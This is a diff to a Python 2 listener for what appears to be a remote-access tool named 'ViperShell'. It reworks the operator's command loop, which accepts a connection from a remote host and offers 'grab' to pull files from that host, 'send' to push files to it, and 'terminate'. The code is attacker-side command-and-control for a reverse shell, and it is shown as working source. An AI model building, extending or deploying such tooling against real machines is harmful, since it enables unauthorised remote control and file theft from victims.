@@ -84,22 +84,21 @@ def connect():
             print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
             conn, addr = s.accept()
             print '[+] We got a connection from: ',addr
+            break
 
+        while True:
+            command = raw_input("$ ViperShell>> ")
 
+            if 'terminate' in command:
+                conn.send('terminate')
+                conn.close() #close the connection with host
+                break
+            elif 'grab' in command:
+                transfer(conn,command)  #usage shell > grab*file
 
-            while True:
-                command = raw_input("$ ViperShell>> ")
-                if 'terminate' in command:
-                    conn.send('terminate')
-                    conn.close() #close the connection with host
-                    break
-        
-                elif 'grab' in command:
-                #usage shell > grab*file
-                    transfer(conn,command)
-                elif 'send' in command:
-                    conn.send(command)
-                    sendW,path = command.split('*')
+            elif 'send' in command:
+                conn.send(command)
+                sendW,path = command.split('*')
                 try:
                     send(conn, path, command)
                 except Exception,e:
@@ -112,10 +111,7 @@ def connect():
     except KeyboardInterrupt:
         print 'interrupted!'
         print 'returning to main program'
-        os.system('python ../../viper.py')
-        
-
-        
+        os.system('python ../../viper.py')      
 
 def main():
     banner()
